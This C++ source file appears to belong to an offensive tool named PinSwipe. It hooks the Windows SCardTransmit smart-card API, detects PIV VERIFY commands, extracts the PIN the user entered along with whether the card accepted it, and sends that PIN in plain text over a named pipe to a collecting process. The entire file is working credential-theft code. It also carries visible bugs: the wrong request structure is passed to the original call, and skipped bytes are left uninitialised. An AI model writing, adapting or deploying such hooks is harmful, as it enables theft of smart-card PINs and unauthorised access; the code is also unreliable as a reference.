
#include "pch.h"
#include "framework.h"
#include "PinSwipe.h"
#include "stdio.h"

//Pointer to the trampoline function used to call the original APIs
pSCardTransmit pOriginalpSCardTransmit = nullptr;
const TCHAR* pipeName = TEXT("\\\\.\\pipe\\PinSwipe");

const char* GetPinType(unsigned char pinType) {
	switch (pinType) {
		case 0:
			return "Global";		
		case 0x80:
			return "PIV Card Application";
		default:
			return "Unsupported";
	}
}

void SendPINOverPipe(const char* message) {

	HANDLE hPipe = CreateFile(pipeName, GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
	DWORD bytesWritten = 0;

	if (hPipe == INVALID_HANDLE_VALUE) {
		//Either the pipe is busy or our server pipe is not listening.  
		//We wont wait though as this will hold up whatever process is currently 
		//sending a PDU to the smart card.
		return;
	}

	WriteFile(hPipe, message, strlen(message) + 1, &bytesWritten, NULL);
	CloseHandle(hPipe);
}

char* GetPinAsASCII(const unsigned char* cdField, int cdFieldLen, char* output) {

	int idx = 0;
	for (; idx < cdFieldLen; ++idx) {
		if(cdField[idx] != 0xFF)
			output[idx] = cdField[idx];
	}
	output[idx] = '\0';
	return output;
}

DWORD WINAPI SCardTransmit_Hooked(SCARDHANDLE hCard,
	LPCSCARD_IO_REQUEST pioSendPci,
	LPCBYTE             pbSendBuffer,
	DWORD               cbSendLength,
	LPSCARD_IO_REQUEST  pioRecvPci,
	LPBYTE              pbRecvBuffer,
	LPDWORD             pcbRecvLength) {
	
	char debugString[1024] = { 0 };
	DWORD result = pOriginalpSCardTransmit(hCard, pioRecvPci, pbSendBuffer, cbSendLength, pioRecvPci, pbRecvBuffer, pcbRecvLength);

	//Check for CLA 0, INS 0x20 (VERIFY) and P1 of 00/FF according to NIST.SP.800-73-4 (PIV) specification
	if (cbSendLength >= 13 && pbSendBuffer[0] == 0 && pbSendBuffer[1] == 0x20 && (pbSendBuffer[2] == 0 || pbSendBuffer[2] == 0xff)) {

		//Check card response status for success
		bool success = false;
		if (pbRecvBuffer[0] == 0x90 && pbRecvBuffer[1] == 0x00) {
			success = true;
		}

		char asciiPin[9];
		sprintf_s(debugString, sizeof(debugString), "Swipped VERIFY PIN: Type %s, Valid: %s, Pin: %s", GetPinType(pbSendBuffer[3]), success ? "true" : "false", 
			GetPinAsASCII(pbSendBuffer+5, min(pbSendBuffer[4],8), asciiPin));

		SendPINOverPipe(debugString);			
	}

	return result;
}
